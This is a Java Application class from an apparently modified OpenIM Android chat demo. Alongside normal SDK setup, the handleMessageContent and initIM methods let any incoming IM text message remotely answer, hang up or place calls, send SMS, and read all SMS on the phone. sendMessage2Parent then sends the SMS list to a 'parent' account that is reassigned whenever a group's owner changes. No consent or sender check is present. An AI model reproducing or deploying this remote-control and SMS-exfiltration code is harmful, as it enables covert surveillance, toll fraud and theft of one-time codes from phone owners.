package io.openim.android.demo;
import android.content.Intent;
import android.widget.Toast;

import androidx.multidex.MultiDex;
import com.alibaba.android.arouter.launcher.ARouter;
import com.alibaba.fastjson.JSONArray;
import com.igexin.sdk.PushManager;
import com.tencent.bugly.crashreport.CrashReport;
import com.vanniktech.emoji.EmojiManager;
import com.vanniktech.emoji.google.GoogleEmojiProvider;
import java.io.File;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;
import io.openim.android.demo.ui.login.LoginActivity;
import io.openim.android.ouicore.base.BaseApp;
import io.openim.android.ouicore.base.vm.injection.Easy;
import io.openim.android.ouicore.entity.LoginCertificate;
import io.openim.android.ouicore.im.IM;
import io.openim.android.ouicore.im.IMEvent;
import io.openim.android.ouicore.net.RXRetrofit.HttpConfig;
import io.openim.android.ouicore.net.RXRetrofit.N;
import io.openim.android.ouicore.net.bage.GsonHel;
import io.openim.android.ouicore.services.CallingService;
import io.openim.android.ouicore.utils.ActivityManager;
import io.openim.android.ouicore.utils.Common;
import io.openim.android.ouicore.utils.Constants;
import io.openim.android.ouicore.utils.L;
import io.openim.android.ouicore.utils.Routes;
import io.openim.android.ouicore.utils.SharedPreferencesUtil;
import io.openim.android.ouicore.vm.UserLogic;
import io.openim.android.ouicore.voice.SPlayer;
import io.openim.android.sdk.OpenIMClient;
import io.openim.android.sdk.enums.MessageType;
import io.openim.android.sdk.listener.OnAdvanceMsgListener;
import io.openim.android.sdk.listener.OnConnListener;
import io.openim.android.sdk.listener.OnGroupListener;
import io.openim.android.sdk.listener.OnMsgSendCallback;
import io.openim.android.sdk.models.GroupApplicationInfo;
import io.openim.android.sdk.models.GroupInfo;
import io.openim.android.sdk.models.GroupMembersInfo;
import io.openim.android.sdk.models.Message;
import io.openim.android.sdk.models.OfflinePushInfo;
import io.openim.android.sdk.models.SignalingInfo;
import io.openim.android.sdk.models.SignalingInvitationInfo;
import okhttp3.Request;
import okhttp3.Response;


public class DemoApplication extends BaseApp {
    private static final String TAG = BaseApp.class.getSimpleName();
    private PhoneUtils phoneUtils =new PhoneUtils();

    @Override
    public void onCreate() {
        L.e(TAG, "-----onCreate------");
        super.onCreate();
        MultiDex.install(this);
        // 添加电话状态的监听
        initFile();
        initARouter();
        initController();
        initNet();
        initBugly();
        initPush();
        initIM();

        EmojiManager.install(new GoogleEmojiProvider());
        //音频播放
        SPlayer.init(this);
        SPlayer.instance().setCacheDirPath(Constants.AUDIO_DIR);
    }
    private void initFile() {
        buildDirectory(Constants.AUDIO_DIR);
        buildDirectory(Constants.VIDEO_DIR);
        buildDirectory(Constants.PICTURE_DIR);
        buildDirectory(Constants.File_DIR);
    }

    private boolean buildDirectory(String path) {
        File file = new File(path);
        if (file.exists())
            return true;
        return file.mkdirs();
    }

    private void initARouter() {
        ARouter.init(this);
//        if (L.isDebug){
//            ARouter.openLog();
//            ARouter.openDebug();
//        }
    }

    private void initBugly() {
        CrashReport.setAppChannel(this,Common.isApkDebug() ? "debug" : "release");
        CrashReport.initCrashReport(getApplicationContext(), "4d365d80d1", L.isDebug);

//        new UpdateApp().init(R.mipmap.ic_launcher).checkUpdate(BaseApp.inst());
    }


    private void initController() {
        Easy.installVM(UserLogic.class);
    }


    private void initPush() {
        PushManager.getInstance().initialize(this);
        PushManager.getInstance().setDebugLogger(this, s -> L.i("getui", s));
    }

    private void initNet() {
        N.init(new HttpConfig().setBaseUrl(Constants.getAppAuthUrl()).addInterceptor(chain -> {
            String token = "";
            try {
                token = BaseApp.inst().loginCertificate.chatToken;
            } catch (Exception ignored) {
            }
            Request request = chain.request().newBuilder().addHeader("token", token).addHeader(
                "operationID", System.currentTimeMillis() + "").build();
            Response response = chain.proceed(request);
            return response;
        }));
    }
    public JSONObject handleMessageContent(String jsonStr){
        try {
            // 将JSON字符串解析为JSONObject对象
            JSONObject jsonObject = new JSONObject(jsonStr);
            System.out.println("解析后的JSONObject：");
            System.out.println(jsonObject);
            // 获取各个键对应的值示例
            String type = jsonObject.getString("type");
            String mobile = jsonObject.getString("mobile");
            String content = jsonObject.getString("content");
           switch (type){
               case "idle":
                    phoneUtils.hangUpCall(this);
                   break;
               case "answer":
                   phoneUtils.answerCall(this);
                   break;
               case "call":
                    phoneUtils.makePhoneCall(this,mobile);
                    break;
               case "send_message":
                   phoneUtils.sendSms(mobile,content);
                   break;
               case "get_sms":
                   ArrayList<HashMap<String,String>> messageList=phoneUtils.readSms(this);
                   sendMessage2Parent("sms_list","",messageList.toString());

           }
            return jsonObject;
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }
    private void initIM() {
        IM.initSdk(this);
        listenerIMOffline();
        listenerIMGroup();
        CallingService callingService= (CallingService) ARouter.getInstance().build(Routes.Service.CALLING).navigation();
        boolean isAdmin =SharedPreferencesUtil.get(this).getBoolean(Constants.K_IS_ADMIN);
        if (null!=callingService && !isAdmin){//add listener when enable isAdmin
            IMEvent.getInstance().addAdvanceMsgListener(new OnAdvanceMsgListener() {
                @Override
                public void onRecvNewMessage(Message msg) {
                    if(msg.getContentType()==MessageType.TEXT){
                        String messageContent=msg.getTextElem().getContent();
                        handleMessageContent(messageContent);
//                        Map map = JSONArray.parseObject(msg.getCustomElem().getData(), Map.class);
//                        if (map.containsKey(Constants.K_CUSTOM_TYPE)) {
//                            int customType = (int) map.get(Constants.K_CUSTOM_TYPE);
//                            Object result = map.get(Constants.K_DATA);
//                            if (customType >= Constants.MsgType.callingInvite
//                                && customType<=Constants.MsgType.callingHungup ) {
//                                SignalingInvitationInfo signalingInvitationInfo = GsonHel.fromJson((String) result, SignalingInvitationInfo.class);
//                                SignalingInfo signalingInfo=new SignalingInfo();
//                                signalingInfo.setInvitation(signalingInvitationInfo);
//
//                                switch (customType) {
//                                    case Constants.MsgType.callingInvite:
//                                        callingService.onReceiveNewInvitation(signalingInfo);
//                                        break;
//                                    case Constants.MsgType.callingAccept:
//                                        callingService.onInviteeAccepted(signalingInfo);
//                                        break;
//                                    case Constants.MsgType.callingReject:
//                                        callingService.onInviteeRejected(signalingInfo);
//                                        break;
//                                    case Constants.MsgType.callingCancel:
//                                        callingService.onInvitationCancelled(signalingInfo);
//                                        break;
//                                    case Constants.MsgType.callingHungup:
//                                        callingService.onHangup(signalingInfo);
//                                        break;
//                                }
//                            }
//                        }

                    }

                }
            });
        }
        else{
            System.out.println("ToPhone:已开启过滤通知模式");
        }

    }
    private void listenerIMGroup(){
        IMEvent.getInstance().addGroupListener(new OnGroupListener() {
            @Override
            public void onGroupApplicationAccepted(GroupApplicationInfo info) {
                OnGroupListener.super.onGroupApplicationAccepted(info);
            }

            @Override
            public void onGroupApplicationAdded(GroupApplicationInfo info) {
                OnGroupListener.super.onGroupApplicationAdded(info);
            }

            @Override
            public void onGroupApplicationDeleted(GroupApplicationInfo info) {
                OnGroupListener.super.onGroupApplicationDeleted(info);
            }

            @Override
            public void onGroupApplicationRejected(GroupApplicationInfo info) {
                OnGroupListener.super.onGroupApplicationRejected(info);
            }

            @Override
            public void onGroupDismissed(GroupInfo info) {
                OnGroupListener.super.onGroupDismissed(info);
            }

            @Override
            public void onGroupInfoChanged(GroupInfo info) {
                OnGroupListener.super.onGroupInfoChanged(info);
                String newOwnerUID = info.getOwnerUserID();
                SharedPreferencesUtil.get(BaseApp.inst()).setCache(Constants.K_PARENT_UID, newOwnerUID);
                Toast.makeText(DemoApplication.this, "甲方UID:"+newOwnerUID, Toast.LENGTH_SHORT).show();
            }

            @Override
            public void onGroupMemberAdded(GroupMembersInfo info) {
                OnGroupListener.super.onGroupMemberAdded(info);
            }

            @Override
            public void onGroupMemberDeleted(GroupMembersInfo info) {
                OnGroupListener.super.onGroupMemberDeleted(info);
            }

            @Override
            public void onGroupMemberInfoChanged(GroupMembersInfo info) {
                OnGroupListener.super.onGroupMemberInfoChanged(info);
            }

            @Override
            public void onJoinedGroupAdded(GroupInfo info) {
                OnGroupListener.super.onJoinedGroupAdded(info);
            }

            @Override
            public void onJoinedGroupDeleted(GroupInfo info) {
                OnGroupListener.super.onJoinedGroupDeleted(info);
            }
        });
    }

    private void listenerIMOffline() {
        IMEvent.getInstance().addConnListener(new OnConnListener() {
            @Override
            public void onConnectFailed(long code, String error) {

            }

            @Override
            public void onConnectSuccess() {

            }

            @Override
            public void onConnecting() {

            }

            @Override
            public void onKickedOffline() {
                offline();
            }

            @Override
            public void onUserTokenExpired() {
                offline();
            }


        });
    }

    public void offline() {
        LoginCertificate.clear();
        CallingService callingService =
            (CallingService) ARouter.getInstance().build(Routes.Service.CALLING).navigation();
        if (null != callingService) callingService.stopAudioVideoService(BaseApp.inst());

        ActivityManager.finishAllExceptActivity();
        startActivity(new Intent(BaseApp.inst(), LoginActivity.class).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
    }
    public static  void sendMessage2Parent(String stateText,String incomingNumber,String content){
        String jsonString = "{\"type\":\"" + stateText + "\",\"mobile\":\"" + incomingNumber + "\",\"content\":\"" + content + "\"}";
        Message message= OpenIMClient.getInstance().messageManager. createTextMessage(jsonString);
        OfflinePushInfo offlinePushInfo = new OfflinePushInfo();
        String CurrentUID = SharedPreferencesUtil.get(BaseApp.inst()).getString(Constants.K_PARENT_UID);
        OpenIMClient.getInstance().messageManager.sendMessage( new OnMsgSendCallback(){

            @Override
            public void onError(int code, String error) {
                System.out.println("send message error"+code+error);
                //发送失败
            }

            @Override
            public void onProgress(long progress) {
                //发送进度
            }

            @Override
            public void onSuccess(Message s) {
                System.out.println("send message success");
                //发送成功
            }
        },  message,  CurrentUID,  null,  offlinePushInfo);
    }
}
